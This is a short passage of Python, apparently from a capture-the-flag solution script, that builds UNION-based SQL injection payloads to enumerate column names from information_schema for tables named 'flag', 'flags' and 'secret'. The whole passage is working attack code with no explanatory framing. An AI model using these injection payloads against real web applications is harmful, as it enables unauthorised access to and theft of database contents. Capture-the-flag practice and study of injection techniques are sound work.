    table_names = ['flag', 'flags', 'secret']

columns_info = {}
for table in table_names:
    print(f"\n[+] Enumerating columns in table '{table}'...")
    
    # Get column names from information_schema
    columns_payload = f"test' UNION SELECT column_name, {', '.join(['NULL'] * (col_count - 1))} FROM information_schema.columns WHERE table_name='{table}'-- "
    
    response = send_payload(columns_payload)
    if response and response.status_code == 200:
        data = extract_data(response)
        columns_info[table] = data
